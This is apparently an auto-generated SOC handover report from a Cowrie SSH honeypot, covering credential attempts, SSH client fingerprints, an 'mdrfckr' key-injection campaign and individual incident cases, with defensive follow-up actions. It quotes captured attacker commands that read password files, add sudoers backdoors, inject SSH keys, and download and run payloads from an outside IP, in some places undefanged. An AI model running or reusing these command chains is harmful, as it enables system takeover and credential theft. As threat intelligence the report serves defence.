# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-07 |
| **Generated At** | 2026-06-07T21:18:37Z |
| **Shift Time** | 21:18 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **141** |
| Confirmed Threats | **128** |
| False Positives Filtered | **13** (9.2%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **8** |
| High Severity Cases | **29** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **112** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **89** |
| Unique Credential Pairs | **69** |
| Unique Usernames | **44** |
| Unique Passwords | **62** |
| Successful Auth Pairs | **27** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `345gs5662d34` | 5 |
| `maui` | 4 |
| `webaccess` | 2 |
| `authors` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 8 |
| `3245gs5662d34` | 6 |
| `345gs5662d34` | 5 |
| `webaccess` | 2 |
| `authors123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 6 |
| `345gs5662d34` | `345gs5662d34` | 5 |
| `webaccess` | `webaccess` | 2 |
| `authors` | `authors123` | 2 |
| `know` | `know123` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aliyun2026` | `125.39.11.27` | 2026-06-07T19:32:47 |
| `root` | `toor` | `125.39.11.27` | 2026-06-07T19:32:58 |
| `root` | `1qaz@WSX#edc` | `125.39.11.27` | 2026-06-07T19:33:08 |
| `root` | `root@1234` | `125.39.11.27` | 2026-06-07T19:33:30 |
| `root` | `Abc12` | `125.39.11.27` | 2026-06-07T19:33:41 |
| `root` | `12qwaszx` | `125.39.11.27` | 2026-06-07T19:33:53 |
| `root` | `startimes@2024` | `125.39.11.27` | 2026-06-07T19:34:18 |
| `root` | `admin12345` | `125.39.11.27` | 2026-06-07T19:34:31 |
| `root` | `BSsrv_10!@#20221011lupi_songyuan` | `125.39.11.27` | 2026-06-07T19:35:38 |
| `root` | `Zccq202406#mysql` | `125.39.11.27` | 2026-06-07T19:35:53 |
| `root` | `root@WSX3edc` | `125.39.11.27` | 2026-06-07T19:36:08 |
| `root` | `Biogenic` | `125.39.11.27` | 2026-06-07T19:36:24 |
| `root` | `polo123.` | `125.39.11.27` | 2026-06-07T19:36:40 |
| `root` | `YUxinmiao1406` | `125.39.11.27` | 2026-06-07T19:36:57 |
| `root` | `Huawei@123` | `125.39.11.27` | 2026-06-07T19:37:32 |
| `root` | `dahuacloud` | `125.39.11.27` | 2026-06-07T19:37:51 |
| `root` | `ubuntu` | `14.29.196.194` | 2026-06-07T19:42:58 |
| `root` | `8i9o0p-[` | `115.190.181.18` | 2026-06-07T20:22:55 |
| `root` | `3245gs5662d34` | `115.190.181.18` | 2026-06-07T20:23:05 |
| `root` | `A12345678a` | `91.185.75.244` | 2026-06-07T20:26:01 |
| `root` | `3245gs5662d34` | `91.185.75.244` | 2026-06-07T20:26:12 |
| `root` | `Azertyuiop1` | `186.158.182.21` | 2026-06-07T20:33:14 |
| `root` | `3245gs5662d34` | `186.158.182.21` | 2026-06-07T20:33:26 |
| `root` | `Pass1234!` | `186.158.182.21` | 2026-06-07T20:54:20 |
| `root` | `admin2024` | `151.252.84.225` | 2026-06-07T20:56:43 |
| `root` | `3245gs5662d34` | `151.252.84.225` | 2026-06-07T20:56:48 |
| `root` | `8i9o0p-[` | `186.158.182.21` | 2026-06-07T20:57:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **141** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 88 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 56 | 5 |
| `92674389fa1e...` | Mirai/variant | 28 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |
| `af8223ac9914...` | libssh-based | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 56 | 5 | Mirai/variant |
| `92674389fa1e...` | libssh | 28 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 1 | 1 | libssh-based |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 4 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 16 | 1 | `T1021.004, T1078, T1105, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `115.190.181.18`, `91.185.75.244`, `151.252.84.225`, `186.158.182.21`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://103.56.149.224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget http://103.56.149.224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi
```
Source IPs: `125.39.11.27`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **18** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS398101` | GoDaddy.com, LLC | 1 | HIGH |
| `AS9674` | Far EastTone Telecommunication Co., Ltd. | 1 | MEDIUM |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS138608` | Cloud Host Pte Ltd | 1 | HIGH |
| `AS24186` | RailTel Corporation of India Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (29)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-20df13a9fe59

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:32 |
| **Last Seen** | 2026-06-07 19:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/ns3.jpg |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:32:46` | `cowrie.session.connect` |
| `2026-06-07 19:32:46` | `cowrie.client.version` |
| `2026-06-07 19:32:46` | `cowrie.client.kex` |
| `2026-06-07 19:32:47` | `cowrie.login.success` |
| `2026-06-07 19:32:47` | `cowrie.session.params` |
| `2026-06-07 19:32:47` | `cowrie.command.input` |
| `2026-06-07 19:32:48` | `cowrie.session.file_download` |
| `2026-06-07 19:32:48` | `cowrie.session.file_download` |
| `2026-06-07 19:32:48` | `cowrie.session.file_download.failed` |
| `2026-06-07 19:32:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0757c0fb8190

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:32 |
| **Last Seen** | 2026-06-07 19:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/ns3.jpg |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:32:57` | `cowrie.session.connect` |
| `2026-06-07 19:32:57` | `cowrie.client.version` |
| `2026-06-07 19:32:57` | `cowrie.client.kex` |
| `2026-06-07 19:32:58` | `cowrie.login.success` |
| `2026-06-07 19:32:58` | `cowrie.session.params` |
| `2026-06-07 19:32:58` | `cowrie.command.input` |
| `2026-06-07 19:32:58` | `cowrie.session.file_download` |
| `2026-06-07 19:32:58` | `cowrie.session.file_download` |
| `2026-06-07 19:32:58` | `cowrie.session.file_download.failed` |
| `2026-06-07 19:32:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-763ace6497ca

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:33 |
| **Last Seen** | 2026-06-07 19:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/oto |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:33:07` | `cowrie.session.connect` |
| `2026-06-07 19:33:07` | `cowrie.client.version` |
| `2026-06-07 19:33:07` | `cowrie.client.kex` |
| `2026-06-07 19:33:08` | `cowrie.login.success` |
| `2026-06-07 19:33:08` | `cowrie.session.params` |
| `2026-06-07 19:33:08` | `cowrie.command.input` |
| `2026-06-07 19:33:09` | `cowrie.session.file_download` |
| `2026-06-07 19:33:09` | `cowrie.session.file_download` |
| `2026-06-07 19:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-415797d573e3

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:33 |
| **Last Seen** | 2026-06-07 19:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/oto |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:33:29` | `cowrie.session.connect` |
| `2026-06-07 19:33:29` | `cowrie.client.version` |
| `2026-06-07 19:33:29` | `cowrie.client.kex` |
| `2026-06-07 19:33:30` | `cowrie.login.success` |
| `2026-06-07 19:33:30` | `cowrie.session.params` |
| `2026-06-07 19:33:30` | `cowrie.command.input` |
| `2026-06-07 19:33:30` | `cowrie.command.failed` |
| `2026-06-07 19:33:30` | `cowrie.command.failed` |
| `2026-06-07 19:33:30` | `cowrie.command.failed` |
| `2026-06-07 19:33:30` | `cowrie.session.file_download` |
| `2026-06-07 19:33:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c9e0d94697f

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:33 |
| **Last Seen** | 2026-06-07 19:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/oto |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:33:41` | `cowrie.session.connect` |
| `2026-06-07 19:33:41` | `cowrie.client.version` |
| `2026-06-07 19:33:41` | `cowrie.client.kex` |
| `2026-06-07 19:33:41` | `cowrie.login.success` |
| `2026-06-07 19:33:42` | `cowrie.session.params` |
| `2026-06-07 19:33:42` | `cowrie.command.input` |
| `2026-06-07 19:33:42` | `cowrie.command.failed` |
| `2026-06-07 19:33:42` | `cowrie.command.failed` |
| `2026-06-07 19:33:42` | `cowrie.command.failed` |
| `2026-06-07 19:33:42` | `cowrie.session.file_download` |
| `2026-06-07 19:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-834f53989f98

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:33 |
| **Last Seen** | 2026-06-07 19:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/ns3.jpg |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:33:52` | `cowrie.session.connect` |
| `2026-06-07 19:33:52` | `cowrie.client.version` |
| `2026-06-07 19:33:52` | `cowrie.client.kex` |
| `2026-06-07 19:33:53` | `cowrie.login.success` |
| `2026-06-07 19:33:53` | `cowrie.session.params` |
| `2026-06-07 19:33:53` | `cowrie.command.input` |
| `2026-06-07 19:33:54` | `cowrie.session.file_download` |
| `2026-06-07 19:33:54` | `cowrie.session.file_download` |
| `2026-06-07 19:33:54` | `cowrie.session.file_download.failed` |
| `2026-06-07 19:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44a0cf8d78c9

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:34 |
| **Last Seen** | 2026-06-07 19:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/ns3.jpg |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:34:17` | `cowrie.session.connect` |
| `2026-06-07 19:34:17` | `cowrie.client.version` |
| `2026-06-07 19:34:17` | `cowrie.client.kex` |
| `2026-06-07 19:34:18` | `cowrie.login.success` |
| `2026-06-07 19:34:18` | `cowrie.session.params` |
| `2026-06-07 19:34:18` | `cowrie.command.input` |
| `2026-06-07 19:34:18` | `cowrie.session.file_download` |
| `2026-06-07 19:34:18` | `cowrie.session.file_download` |
| `2026-06-07 19:34:18` | `cowrie.session.file_download.failed` |
| `2026-06-07 19:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b1610316d76

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:34 |
| **Last Seen** | 2026-06-07 19:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/oto |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:34:30` | `cowrie.session.connect` |
| `2026-06-07 19:34:30` | `cowrie.client.version` |
| `2026-06-07 19:34:30` | `cowrie.client.kex` |
| `2026-06-07 19:34:31` | `cowrie.login.success` |
| `2026-06-07 19:34:31` | `cowrie.session.params` |
| `2026-06-07 19:34:31` | `cowrie.command.input` |
| `2026-06-07 19:34:31` | `cowrie.session.file_download` |
| `2026-06-07 19:34:31` | `cowrie.session.file_download` |
| `2026-06-07 19:34:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a65c1d7ec03

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:35 |
| **Last Seen** | 2026-06-07 19:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget hxxp://103.56.149[.]224/cacti/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbi` |
| **Download Attempts** | hxxp://103.56.149[.]224/cacti/ns1.jpg, hxxp://103.56.149[.]224/cacti/ns3.jpg |
| **Malware Analysis** | 80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880 (LOW) |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-07 19:35:37` | `cowrie.session.connect` |
| `2026-06-07 19:35:37` | `cowrie.client.version` |
| `2026-06-07 19:35:37` | `cowrie.client.kex` |
| `2026-06-07 19:35:38` | `cowrie.login.success` |
| `2026-06-07 19:35:38` | `cowrie.session.params` |
| `2026-06-07 19:35:38` | `cowrie.command.input` |
| `2026-06-07 19:35:38` | `cowrie.session.file_download` |
| `2026-06-07 19:35:39` | `cowrie.session.file_download` |
| `2026-06-07 19:35:39` | `cowrie.session.file_download.failed` |
| `2026-06-07 19:35:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.39.11[.]27` to AbuseIPDB if not already reported
- [ ] Block `125.39.11[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71c596996404

| Field | Detail |
|---|---|
| **Source IP** | `125.39.11[.]27` |
| **First Seen** | 2026-06-07 19:35 |
| **Last Seen** | 2026-06-07 19:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
